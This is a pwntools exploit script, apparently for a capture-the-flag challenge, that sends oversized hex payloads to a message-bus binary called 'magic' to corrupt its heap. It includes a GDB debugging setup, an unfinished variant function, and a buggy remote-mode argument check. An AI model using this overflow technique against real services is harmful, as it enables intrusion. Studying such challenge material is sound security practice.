#!/usr/bin/env python3

from binascii import hexlify, unhexlify
from pwn import *
import json
import typing
import argparse as ap

BINARY_PATH="../static/build"
BINARY_NAME="magic"

class Interface():
    MSG_FORMAT = {
        "payload": {
            "msg": "",
            "hex": True,
            "pipe_id": 0,
            "msg_id": 0
        }}

    def __init__(self, io):
        io.recvuntil(b"> ")
        io.timeout = 10

        self.io = io

    def post_msg(self, msg: str) -> None:
        self.io.sendline(b"1")
        self.io.sendlineafter(b"bus: ", f"{msg}".encode())

        output = self.io.recvuntil(b"1: ", drop=True)
        print(output)

        self.io.recvuntil(b"> ")

    def handle_st_msg(self, st_num) -> None:
        self.io.sendline(str(st_num + 2).encode())
        self.io.recvuntil(b"> ")

    def exit_prog(self) -> None:
        self.io.sendline(b"4")
        # time.sleep(5)
        output = self.io.recvuntil(b"Bye")

        return output

    def interactive(self):
        self.io.interactive()

    @staticmethod
    def make_msg(msg: str, ishex: bool, pipe_id: int, msg_id: int, convert: bool=False, append="", prepend=""):
        j = dict(Interface.MSG_FORMAT)

        if convert:
            msg = binascii.hexlify(msg).decode()

        msg = msg if isinstance(msg, str) else msg.decode()
        msg = prepend+msg+append

        j["payload"]["msg"]     = msg
        j["payload"]["hex"]     = ishex
        j["payload"]["pipe_id"] = pipe_id
        j["payload"]["msg_id"]  = msg_id

        try:
            j = json.dumps(j)
        except TypeError as e:
            print("Could not encode dictionary to JSON")
            exit(1)
        
        return j

def main(proc_io):
    io = Interface(proc_io)
    
    msg = Interface.make_msg(
        p64(0xFFFFFFFFFFFFFFFF)*(0x120 // 8),
        ishex=True,
        pipe_id=0,
        msg_id=100,
        convert=True,
        append="",
        prepend=""
    )

    print(msg)
    io.post_msg(msg)
    io.handle_st_msg(0)

    msg = Interface.make_msg(
        p64(0x31)*(0x128 // 8),
        ishex=True,
        pipe_id=0,
        msg_id=100,
        convert=True,
        append="1",
        prepend=""
    )

    # for i in range(2):
    io.post_msg(msg)
    # io.handle_st_msg(0)
    
    io.interactive()

def saved(proc_io):
    io = Interface(proc_io)
    
    msg = Interface.make_msg(
        p64(0xFFFFFFFFFFFFFFFF)*(0x320 // 8),
        ishex=True,
        pipe_id=0,
        msg_id=100,
        convert=True,
        append="",
        prepend=""
    )

    print(msg)
    io.post_msg(msg)
    io.handle_st_msg(0)

    msg = Interface.make_msg(
        p64(0x31)*(0x328 // 8),
        ishex=True,
        pipe_id=0,
        msg_id=100,
        convert=True,
        append="1",
        prepend=""
    )

    io.post_msg(msg)
    io.handle_st_msg(0)

    io.post_msg(msg)
    io.handle_st_msg(0)

    io.post_msg(msg)
    io.post_msg(msg)
    io.handle_st_msg(0)
    
    msg = Interface.make_msg(
        p64(0xFFFFFFFFFFFFFFFF)*(0x200 // 8),
        ishex=True,
        pipe_id=0,
        msg_id=100,
        convert=True,
        append="",
        prepend=""
    )

    # for i in range(10):
    #     io.post_msg(msg)
    # for i in range(10):
    #     io.handle_st_msg(0)
    
    io.interactive()

if __name__ == "__main__":
    parser = ap.ArgumentParser()
    parser.add_argument('--hostname')
    parser.add_argument('--port')
    parser.add_argument('--debug', '-d', action='store_true')

    run_type = parser.add_mutually_exclusive_group()

    run_type.add_argument('--GDB', action='store_true')
    run_type.add_argument('--LOCAL', action='store_true')
    args = parser.parse_args()

    if args.debug:
        context.log_level = 'debug'

    proc_io = None

    gs = """
    set max-visualize-chunk-size 0x500
    break bus.cpp:283
    disable
    continue
    """

    if args.GDB:
        os.chdir(BINARY_PATH)
        elf = context.binary = ELF(BINARY_NAME)
        proc_io = gdb.debug(elf.path, gdbscript=gs)
    elif args.LOCAL:
        os.chdir(BINARY_PATH)
        elf = context.binary = ELF(BINARY_NAME)
        proc_io = process(elf.path)
    else:
        if not args.hostname or args.port:
            parser.print_usage()
            print("error: the following arguments are required: --hostname, --port")
            exit(-1)
        proc_io = remote(args.hostname, args.port )

    main(proc_io)
